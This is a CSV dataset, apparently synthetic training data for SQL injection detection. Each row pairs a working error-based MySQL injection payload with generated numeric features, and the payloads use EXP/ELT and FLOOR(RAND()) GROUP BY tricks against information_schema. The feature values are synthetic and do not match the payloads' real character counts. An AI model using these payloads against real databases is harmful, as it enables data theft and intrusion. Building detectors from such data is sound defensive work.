id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000025,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.703098671608283,263.6521911621094,73.73543548583984,37.29725646972656,99.65118408203125,2.2141690254211426,90.35354614257812,40.203224182128906,0.8161998987197876,0.30388954281806946,0.17143987119197845,0.3953099250793457,0.12078369408845901,3.802429676055908,0.5348247289657593,0.9778805375099182,0.3445589244365692,0.16483616828918457,0.017053505405783653,0.4155874252319336,10.00841999053955,9.107673645019531,3.6095528602600098,0.06414256989955902,1.7301247119903564,0.3407681882381439,-0.008499747142195702,0.15772294998168945,0.2322031706571579,0.9222559332847595,-0.026216421276330948,-0.2039937674999237,2.092095136642456,-0.1588316559791565,0.3023267984390259,2.2921040058135986,8.013792037963867,1.4535768032073975,3.353940963745117,0.6349741816520691,0.40115442872047424,1.117706537246704,0.19045516848564148,0.03832580894231796,0.3082493543624878,-0.5527220368385315,0.1257510632276535,0.43879708647727966,0.396036833524704,0.44027358293533325,0.2145526111125946,-0.034137945622205734,-0.2569733262062073,0.08659396320581436,0.4387928545475006,0.0042462474666535854,0.05677143856883049,0.021997522562742233,-0.19428715109825134,0.41419926285743713,0.0415019765496254,-0.42245015501976013,-0.34001973271369934,0.2547674775123596,0.16601963341236115,0.01837059110403061,0.6921908855438232,0.2748325765132904,0.029842201620340347,-0.07554486393928528,0.17025300860404968,-0.3245643079280853,0.05230310931801796,-0.19554343819618225,0.03707762807607651,-0.1294475793838501,1.3449815511703491,0.324653685092926,-0.18178799748420715,0.23427751660346985,0.5143900513648987,9.21867561340332,0.7611610293388367,0.3565511703491211,0.007812757045030594,0.8156172633171082,0.0399591326713562,-0.4829345941543579,-0.0844745934009552
GAN_000026,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.185663551850245,277.0851135253906,78.67031860351562,41.49186706542969,104.84571075439453,1.011254072189331,86.03267669677734,36.99880599975586,1.0991272926330566,0.29361143708229065,0.16138359904289246,0.3923754096031189,0.12567266821861267,3.782681941986084,1.2655013799667358,1.018137812614441,0.5274185538291931,0.13110210001468658,-0.03182391822338104,0.1108185201883316,9.61491584777832,9.774765014648438,3.9224534034729004,0.04831605777144432,1.77255380153656,0.2871483266353607,-0.05673541873693466,0.013706461526453495,0.11870948225259781,1.080492615699768,0.028427861630916595,-0.0948539525270462,1.928660273551941,0.056636251509189606,0.3054467439651489,2.0390119552612305,7.737196922302246,0.9387204051017761,2.931030750274658,0.6430060267448425,0.36775749921798706,1.004104733467102,-0.18856534361839294,0.022432954981923103,0.06826247274875641,-0.15449367463588715,-0.2011590301990509,0.3535979986190796,0.3506975769996643,0.4040335714817047,0.14875607192516327,0.21622340381145477,-0.12821680307388306,0.13701650500297546,0.44567590951919556,0.05575210601091385,0.0920725017786026,0.046728938817977905,0.17426098883152008,0.10458466410636902,-0.04680737480521202,0.02931845188140869,-0.04046235233545303,-0.043065913021564484,0.08720150589942932,-0.048327814787626266,0.7285727858543396,0.25679811835289,0.11527858674526215,0.08663197606801987,-0.09582819044589996,-0.0463021881878376,0.03122548945248127,0.06864450126886368,0.037709932774305344,-0.06211947649717331,1.170877456665039,0.3950183093547821,-0.012288354337215424,0.03441532701253891,0.5299703478813171,9.028847694396973,0.8759630918502808,0.3253266513347626,-0.003599954769015312,0.7183968424797058,0.02638588473200798,0.11167354881763458,-0.05083117634057999
GAN_000027,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.20504285222289,275.20391845703125,74.865234375,40.9998779296875,105.5177993774414,-1.1458368301391602,86.85548400878906,38.5646858215332,0.9456250667572021,0.3014603555202484,0.1635614037513733,0.389175683259964,0.12808758020401,3.7702629566192627,1.377007246017456,0.8289417028427124,0.46397924423217773,0.1852436363697052,-0.09388196468353271,0.27763310074806213,9.92020034790039,9.346683502197266,3.990171194076538,0.067435622215271,1.7238843441009521,0.33159393072128296,-0.10058760643005371,0.03546525537967682,0.080358125269413,1.1392484903335571,-0.1324836164712906,-0.23886242508888245,1.995917558670044,-0.02470911666750908,0.2892089784145355,2.206291437149048,8.230737686157227,1.0221151113510132,3.1868815422058105,0.5537447333335876,0.3998228907585144,1.0161021947860718,-0.02744058519601822,0.009148918092250824,0.2779698967933655,-0.2096724659204483,-0.09397241473197937,0.32781293988227844,0.3556602895259857,0.43298667669296265,0.0953068658709526,0.17026826739311218,-0.006432265043258667,0.039000004529953,0.41341719031333923,0.012973007746040821,0.11284372955560684,0.03540667146444321,0.018447458744049072,0.2838589549064636,-0.04164116829633713,-0.18444538116455078,-0.15541577339172363,0.18833193182945251,0.08300676941871643,0.09049243479967117,0.7036214470863342,0.23169326782226562,0.0881447121500969,0.10177408158779144,-0.13518184423446655,-0.11598140746355057,0.03113102726638317,0.0737997442483902,0.03273915499448776,-0.07166320085525513,1.253671646118164,0.367473304271698,-0.19443866610527039,0.1307729035615921,0.5436140894889832,9.809804916381836,0.8705925941467285,0.32876694202423096,-0.003458501771092415,0.7360700368881226,-0.05832451209425926,0.07917116582393646,-0.06493225693702698
GAN_000028,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.470499127285123,280.4449462890625,73.92887878417969,40.013790130615234,99.25367736816406,-0.6022429466247559,93.65908813476562,40.31439971923828,0.833370566368103,0.27939409017562866,0.1630413681268692,0.38927555084228516,0.12658485770225525,3.770548105239868,1.3172798156738281,0.9374426007270813,0.3973948657512665,0.1186024621129036,-0.17885449528694153,0.08759093284606934,10.243000030517578,9.260761260986328,3.4731860160827637,0.04009148105978966,1.645283579826355,0.31643441319465637,0.032389938831329346,-0.11001601815223694,0.1392792910337448,1.1757464408874512,-0.009470667690038681,-0.2163427472114563,1.939601182937622,0.08357200771570206,0.25498291850090027,2.113694429397583,7.885573863983154,0.9507296681404114,3.2577662467956543,0.7188857793807983,0.53565514087677,1.1327186822891235,0.028782635927200317,0.009148262441158295,0.4491136372089386,-0.18865634500980377,-0.04275503754615784,0.3814684748649597,0.32109829783439636,0.5317311882972717,0.11788996309041977,0.19842565059661865,0.026548955589532852,0.1439439058303833,0.4543813467025757,-0.0034614752512425184,0.037204597145318985,0.047151632606983185,0.1193210631608963,0.412680059671402,-0.1689603328704834,-0.050805605947971344,-0.1153959259390831,0.04657655954360962,0.1328463852405548,0.0688135027885437,0.692026674747467,0.5394383668899536,0.055728960782289505,-0.1676037311553955,-0.23252898454666138,-0.159735307097435,0.1523197889328003,0.01274019479751587,0.032521698623895645,-0.0898558497428894,1.1780880689620972,0.2289886325597763,-0.23093098402023315,0.06748862564563751,0.573029637336731,9.092094421386719,1.007157802581787,0.3457488417625427,-0.02351316250860691,0.7593010067939758,0.1934729814529419,0.03656168654561043,0.06163826584815979
GAN_000029,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.2070093651703075,279.72369384765625,76.73927307128906,40.79305648803711,103.61354064941406,-2.298780918121338,84.87564086914062,38.57090759277344,1.1473357677459717,0.2862016558647156,0.15983343124389648,0.3926447927951813,0.12824204564094543,3.786648988723755,1.5932039022445679,1.2018933296203613,0.5883075594902039,0.16104434430599213,-0.018890777602791786,0.03720826655626297,9.689261436462402,9.34841251373291,3.777480125427246,-0.11036472022533417,1.783460259437561,0.2755720913410187,-0.02129964902997017,-0.0660603940486908,0.14271360635757446,1.2361921072006226,0.0016467422246932983,-0.11780781298875809,1.9833953380584717,0.17948728799819946,0.3172542452812195,2.052795886993408,7.671295166015625,0.8397355675697327,3.135061025619507,0.6353351473808289,0.3765546381473541,0.9910871982574463,-0.022707492113113403,0.024893051013350487,0.028564833104610443,-0.08529067039489746,-0.16247829794883728,0.32715901732444763,0.29673516750335693,0.3846883475780487,0.0927128717303276,0.28710439801216125,-0.08636492490768433,-0.011657044291496277,0.38560447096824646,0.06724586337804794,0.08014702051877975,0.06627457588911057,0.0907381922006607,0.09939953684806824,-0.17100846767425537,0.08631682395935059,-0.054961226880550385,0.07350257784128189,0.07211115211248398,-0.1490212082862854,0.7845122814178467,0.24101510643959045,0.10129346698522568,0.08503663539886475,-0.053042568266391754,-0.024761930108070374,0.19683003425598145,0.2884461283683777,0.0376606248319149,0.057450082153081894,1.1463114023208618,0.31105291843414307,-0.15891331434249878,0.06180315464735031,0.5046798586845398,9.60487174987793,0.8469080328941345,0.2834923267364502,-0.00388999842107296,0.7547237873077393,0.1284789741039276,0.15326014161109924,-0.13343670964241028
GAN_000030,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.119556331493145,274.5472717285156,77.25486755371094,42.20825958251953,106.03529357910156,0.12355422973632812,85.39282989501953,36.849334716796875,1.1875230073928833,0.2980867922306061,0.15817050635814667,0.39170849323272705,0.13007059693336487,3.7853598594665527,1.6755006313323975,1.0218374729156494,0.5722240805625916,0.16972902417182922,-0.018429214134812355,0.2470802217721939,9.489541053771973,9.499578475952148,4.206106185913086,-0.037677377462387085,1.7641252279281616,0.26538196206092834,0.017780356109142303,0.16359053552150726,0.12760832905769348,1.2190937995910645,-0.002257663756608963,-0.2532707452774048,2.110006809234619,0.23207080364227295,0.27318787574768066,2.126389503479004,7.575272083282471,0.7851686477661133,2.9412155151367188,0.6029074788093567,0.38426926732063293,1.0088205337524414,0.10810176283121109,0.016712026670575142,0.1178014725446701,0.050271663814783096,-0.2451557219028473,0.3770573139190674,0.29491615295410156,0.35992059111595154,0.18018817901611328,0.280236154794693,-0.05769526958465576,-0.06627016514539719,0.42975544929504395,0.05382073298096657,0.11637141555547714,0.02968733012676239,0.02562364935874939,0.05656920373439789,-0.10571858286857605,0.03141026198863983,-0.014483839273452759,-0.006174992769956589,0.05753627046942711,-0.10999605059623718,0.7255271673202515,0.13695374131202698,0.15754131972789764,0.0017357245087623596,-0.05817989259958267,-0.05281656235456467,-0.06634014844894409,0.21034112572669983,0.03743428736925125,0.08960454165935516,1.1384118795394897,0.32589665055274963,-0.08457127958536148,0.0843437910079956,0.45557066798210144,9.978900909423828,0.7653555870056152,0.31316184997558594,-0.018671749159693718,0.7214564085006714,-0.12278273701667786,0.21859589219093323,-0.13639265298843384
GAN_000031,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.187817495646045,271.35107421875,79.80812072753906,38.715187072753906,101.8696517944336,0.958838701248169,88.354736328125,38.546409606933594,0.8339378237724304,0.29223769903182983,0.15749742090702057,0.3919928967952728,0.12358427047729492,3.7624261379241943,1.1144453287124634,1.0141308307647705,0.4603883624076843,0.07459250092506409,-0.07602589577436447,0.03936658054590225,9.788439750671387,9.490825653076172,3.630241870880127,0.14319747686386108,1.7176800966262817,0.26705437898635864,0.11233460158109665,0.006462336517870426,0.10062732547521591,1.0728721618652344,-0.06963331997394562,-0.015822477638721466,1.8631870746612549,0.014428805559873581,0.3294755816459656,2.0715408325195312,7.895585060119629,1.1105397939682007,3.104914903640747,0.7104096412658691,0.4384431838989258,1.155770182609558,-0.024343326687812805,0.019345691427588463,0.2733341455459595,-0.24263684451580048,-0.08790630102157593,0.32896658778190613,0.25034981966018677,0.4406949281692505,0.09837635606527328,0.2114289253950119,-0.06281843781471252,0.257610023021698,0.47156497836112976,-0.02343270368874073,0.08357112109661102,-0.0766732320189476,0.22046659886837006,0.37949809432029724,-0.09360413253307343,-0.11598917841911316,-0.168882817029953,-0.01299290545284748,0.12453021854162216,0.02768866717815399,0.7318907380104065,0.35402563214302063,0.03291671350598335,-0.10877680778503418,-0.022527985274791718,-0.12435876578092575,0.07224934548139572,0.06925496459007263,0.027029041200876236,-0.1352752149105072,1.2502226829528809,0.3277447521686554,-0.13004961609840393,0.05397888273000717,0.5093691945075989,9.236297607421875,0.8664631247520447,0.28835174441337585,-0.0017798524349927902,0.7377939820289612,0.09559490531682968,-0.02708672732114792,0.042868390679359436
GAN_000032,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.168901850104846,271.6119079589844,80.65338897705078,41.53877258300781,100.35404968261719,2.2824621200561523,83.95828247070312,37.66310119628906,1.033937692642212,0.28868019580841064,0.16019627451896667,0.3879528343677521,0.12574468553066254,3.7984137535095215,1.3880109786987305,0.868321418762207,0.5765674710273743,0.06614045798778534,-0.024088196456432343,0.11586977541446686,9.735546112060547,9.509049415588379,3.997875690460205,-0.023345090448856354,1.749831199645996,0.27728399634361267,0.08926627784967422,0.22273865342140198,0.18523459136486053,1.1534103155136108,-0.03972190245985985,-0.1800687462091446,1.9683430194854736,0.17122337222099304,0.28897494077682495,2.152378797531128,7.658880710601807,0.9168555736541748,2.854973554611206,0.3530578911304474,0.4609508216381073,1.0477334260940552,0.10945770144462585,0.013623958453536034,0.08595260977745056,-0.0628642737865448,-0.11184340715408325,0.38586899638175964,0.38206177949905396,0.36593955755233765,0.20217569172382355,0.2710472345352173,-0.16333886981010437,0.0516488179564476,0.44838961958885193,0.08195171505212784,0.12138503789901733,0.09054305404424667,-0.07159750163555145,0.26866111159324646,-0.016540154814720154,0.15105962753295898,-0.1128498837351799,0.04964771866798401,0.09296983480453491,0.03404725342988968,0.7396159768104553,0.08541186153888702,0.09666536003351212,-0.045044586062431335,-0.12411412596702576,-0.27205488085746765,0.05173768103122711,-0.06852079927921295,0.01718120649456978,-0.0012753978371620178,1.1170679330825806,0.279806524515152,-0.09917379170656204,0.0618927925825119,0.43070080876350403,9.214426040649414,0.8081369996070862,0.3327336013317108,-0.008117208257317543,0.7537474036216736,-0.08174624294042587,-0.07899333536624908,0.004475250840187073
GAN_000033,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.267694050161961,269.9793701171875,79.54175567626953,41.02701187133789,102.71514129638672,2.529550075531006,82.8543472290039,36.047481536865234,1.16358482837677,0.30838698148727417,0.16434349119663239,0.39939484000205994,0.12430062890052795,3.7768337726593018,1.1086727380752563,0.9708395600318909,0.5394605994224548,0.17731356620788574,0.08186071366071701,0.152307391166687,9.788615226745605,9.576106071472168,3.806164503097534,0.041227858513593674,1.8159478902816772,0.3217707574367523,0.030324198305606842,0.18268661201000214,0.18658971786499023,1.0519495010375977,0.05789269879460335,-0.18218794465065002,1.9527924060821533,0.005850277841091156,0.25656411051750183,2.195953845977783,7.79280424118042,1.1347781419754028,2.9832332134246826,0.5838407278060913,0.37112247943878174,0.9589080214500427,-0.04811406880617142,0.03949323669075966,-0.010169759392738342,-0.2782042622566223,-0.23052984476089478,0.43151482939720154,0.35211947560310364,0.40039199590682983,0.25933435559272766,0.16754423081874847,-0.24759641289710999,0.21762269735336304,0.4853573739528656,0.0668511837720871,0.058216821402311325,0.013083968311548233,0.025488674640655518,0.031208641827106476,0.01967812329530716,0.02293451875448227,-0.11754540354013443,0.10389400273561478,0.09666962176561356,-0.08989110589027405,0.7450531721115112,0.1946154236793518,0.14471036195755005,0.05593659356236458,0.11606024205684662,-0.07222161442041397,0.053440626710653305,0.002341851592063904,0.04406096041202545,-0.06809886544942856,1.0898336172103882,0.3691060543060303,-0.027932211756706238,0.09026306122541428,0.45327746868133545,9.1361665725708,0.7526206970214844,0.2962309420108795,0.007070127874612808,0.7528800964355469,-0.054630763828754425,-0.11687235534191132,-0.11341436207294464
GAN_000034,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.444858960206152,292.30267333984375,77.00349426269531,40.19020462036133,105.06742095947266,-2.8391036987304688,87.93560791015625,41.40825653076172,1.0368677377700806,0.2706974744796753,0.16199733316898346,0.3936004042625427,0.12749479711055756,3.7433271408081055,1.4850945472717285,1.5838851928710938,0.7068718671798706,0.1957227885723114,-0.005351003259420395,0.14706526696681976,10.456266403198242,8.947061538696289,3.728895664215088,-0.051867127418518066,1.7345131635665894,0.37235960364341736,0.12333409488201141,-0.23626339435577393,0.18844547867774963,1.4083552360534668,-0.11967481672763824,-0.17461124062538147,1.8892784118652344,0.13733121752738953,0.2636087238788605,2.1352710723876953,7.671772003173828,0.7651347517967224,3.5115692615509033,0.6136132478713989,0.4723442792892456,1.0627108812332153,0.019432246685028076,0.035637371242046356,0.3255179226398468,-0.34413033723831177,-0.16048520803451538,0.3938109874725342,0.2888464629650116,0.5059113502502441,0.017535138875246048,0.29759225249290466,-0.01366771012544632,0.250927209854126,0.36999061703681946,0.012954403646290302,0.10673562437295914,0.05682846158742905,0.19143186509609222,0.12404178082942963,-0.01687714457511902,-0.1353801190853119,-0.2634011507034302,0.04669518768787384,0.10197363048791885,-0.07952816784381866,0.7290706038475037,0.5242910385131836,0.09214760363101959,0.26940909028053284,-0.26070359349250793,-0.16181321442127228,0.013139862567186356,0.19823391735553741,0.06009918823838234,-0.003453921526670456,1.2730108499526978,0.2623118758201599,-0.2761586606502533,-0.01985834538936615,0.6215818524360657,9.206928253173828,0.9601735472679138,0.34636932611465454,-0.024602459743618965,0.802459716796875,0.13292410969734192,0.2045532763004303,-0.05711529403924942
GAN_000035,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.441363468392734,280.3769226074219,75.2688217163086,39.679359436035156,103.1440200805664,-2.556964874267578,89.38117218017578,40.14724349975586,1.2362217903137207,0.27185145020484924,0.16595400869846344,0.3905026614665985,0.12772391736507416,3.7601335048675537,1.3867436647415161,1.23214590549469,0.5194538235664368,0.1830509901046753,-0.05158212035894394,0.3172909617424011,9.849952697753906,9.0057373046875,3.622145175933838,-0.18107959628105164,1.7868883609771729,0.33433130383491516,-0.16979674994945526,-0.08233031630516052,0.11659835278987885,1.2864582538604736,0.011043459177017212,-0.07979576289653778,1.8403170108795166,0.21306607127189636,0.30454590916633606,2.060030937194824,7.693360805511475,0.5781201720237732,3.0600528717041016,0.7639907002449036,0.3690030574798584,1.1156190633773804,-0.18045803904533386,0.01469556987285614,0.07489970326423645,-0.15716616809368134,-0.19920921325683594,0.40538546442985535,0.24709632992744446,0.4177471399307251,0.02705271914601326,0.263959139585495,-0.21947327256202698,0.09688981622457504,0.449241042137146,0.022550376132130623,0.002501415554434061,0.0061760470271110535,0.35858654975891113,-0.041420839726924896,-0.17224067449569702,0.2744690179824829,-0.14501604437828064,0.15731394290924072,0.07727278023958206,-0.21749639511108398,0.7325106859207153,0.5051189661026001,0.27617934346199036,0.06958970427513123,-0.04803843796253204,-0.012959030456840992,0.1837361454963684,0.4454503059387207,0.052299972623586655,-0.0009930692613124847,1.2142599821090698,0.24406984448432922,-0.2607717216014862,-0.033247485756874084,0.597403883934021,9.323718070983887,0.9312300682067871,0.35927268862724304,-0.03990413621068001,0.7083726525306702,0.07547241449356079,0.4118499159812927,-0.2433502972126007
GAN_000036,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.250128699618488,270.1510314941406,78.05999755859375,42.20856475830078,103.63674926757812,-2.804830551147461,82.37283325195312,39.2181510925293,1.0163062810897827,0.28732770681381226,0.16617393493652344,0.3876936435699463,0.1296284943819046,3.7653186321258545,1.79010009765625,0.8643320202827454,0.6885448694229126,0.19291843473911285,0.05354586988687515,0.37019580602645874,9.905850410461426,9.50806999206543,4.501590728759766,-0.0813952088356018,1.6763426065444946,0.3043374717235565,-0.09695654362440109,0.10270895063877106,0.20825758576393127,1.3060981035232544,-0.11026675999164581,-0.44575315713882446,2.1544506549835205,0.34918034076690674,0.2699510157108307,2.1922409534454346,7.5436553955078125,0.9274547100067139,3.064864158630371,0.4184976816177368,0.46623602509498596,0.9790416955947876,0.18422994017601013,0.006233792752027512,0.1514715701341629,-0.03819103538990021,-0.054816700518131256,0.4028102457523346,0.35820308327674866,0.44709905982017517,0.1338670253753662,0.2765541970729828,0.015096012502908707,-0.12103219330310822,0.3665545880794525,0.07679684460163116,0.15798601508140564,0.15042003989219666,-0.08541835844516754,0.2087399661540985,-0.1380423605442047,-0.009417802095413208,-0.049479417502880096,0.22509130835533142,0.05338262394070625,0.009308919310569763,0.7111367583274841,0.08604586124420166,0.16936004161834717,0.15744616091251373,-0.12178626656532288,-0.25366464257240295,0.0876106545329094,0.022859930992126465,0.027823738753795624,0.023224953562021255,1.3100404739379883,0.2780803143978119,-0.24976661801338196,0.09133422374725342,0.44585084915161133,9.634024620056152,0.8789994120597839,0.3534037172794342,-0.028443211689591408,0.7685987949371338,-0.09246964007616043,0.13067257404327393,-0.029631607234477997
GAN_000037,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.137143674043118,272.58258056640625,78.70428466796875,41.785003662109375,103.71565246582031,-1.8646025657653809,83.19932556152344,38.957767486572266,1.2632982730865479,0.2812482416629791,0.16297538578510284,0.3908931612968445,0.12732474505901337,3.7388923168182373,1.646907925605774,1.0232555866241455,0.6500706076622009,0.18948838114738464,-0.10313015431165695,0.11289003491401672,9.50587272644043,9.523309707641602,3.7357773780822754,0.01930329203605652,1.7279099225997925,0.2591102123260498,-0.042788587510585785,0.05578790605068207,0.09524786472320557,1.1284871101379395,-0.046879496425390244,-0.005000188946723938,1.9450933933258057,0.321491003036499,0.34620192646980286,2.0220274925231934,7.450687408447266,0.806766152381897,2.9505484104156494,0.6569325923919678,0.36443060636520386,1.0251357555389404,-0.10011111944913864,0.0014548618346452713,0.0469331294298172,-0.09192265570163727,-0.24325555562973022,0.3186226189136505,0.2661823034286499,0.32877275347709656,0.02592720463871956,0.3013949394226074,-0.13091714680194855,0.07437462359666824,0.40681150555610657,0.051046278327703476,0.1077207624912262,0.13921910524368286,0.10138511657714844,-0.008419595658779144,-0.15874093770980835,0.054741233587265015,-0.04569198936223984,0.1324135959148407,0.08889477699995041,-0.06485182046890259,0.8300276398658752,0.10468773543834686,0.09488685429096222,0.017958320677280426,-0.010725736618041992,-0.15058061480522156,0.04524897411465645,0.27033287286758423,0.024047618731856346,0.14182528853416443,1.2394988536834717,0.2869199514389038,-0.18856647610664368,0.041743963956832886,0.4676600694656372,9.452906608581543,0.8262006044387817,0.2875339090824127,-0.03731927648186684,0.7319869995117188,0.0034213848412036896,0.16463343799114227,-0.26092925667762756
GAN_000038,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.5088382601771,272.9447326660156,70.81407165527344,38.90005874633789,97.95162963867188,0.6758952140808105,91.85626220703125,40.710166931152344,0.9083948731422424,0.28123971819877625,0.1708758920431137,0.390872597694397,0.1258448362350464,3.759403944015503,0.8684762716293335,0.9971584677696228,0.4346816837787628,0.21472673118114471,-0.13023854792118073,0.08309662342071533,10.252434730529785,9.205862045288086,3.2062830924987793,0.012436285614967346,1.777039647102356,0.38585832715034485,-0.003903376404196024,0.009827853180468082,0.2015363723039627,1.1813677549362183,0.01654309406876564,-0.2655206024646759,1.991497278213501,-0.030301060527563095,0.24290917813777924,2.3264880180358887,8.094606399536133,0.931226909160614,3.2978506088256836,0.6006719470024109,0.4786420464515686,1.0897594690322876,0.05379774421453476,0.022824490442872047,0.4558480679988861,-0.3552969694137573,0.007352501153945923,0.36183294653892517,0.35751694440841675,0.5098704695701599,0.12073459476232529,0.10752259939908981,-0.006582431495189667,0.2240171730518341,0.43628990650177,0.034551046788692474,0.04431655630469322,0.08849198371171951,-0.09615997970104218,0.25492551922798157,0.009746253490447998,-0.14773601293563843,-0.17405104637145996,0.15646830201148987,0.14418968558311462,0.03352876007556915,0.7488086819648743,0.4113883674144745,0.03766802325844765,-0.03131091594696045,-0.07629244029521942,-0.12064497917890549,0.15027756989002228,-0.03969205915927887,0.04038429632782936,-0.022229157388210297,1.2584260702133179,0.2784990072250366,-0.1886327862739563,0.17129302024841309,0.6179649829864502,9.677444458007812,0.8973855376243591,0.331845223903656,0.0047315191477537155,0.7782140970230103,0.08334261178970337,-0.05616101995110512,-0.017338626086711884
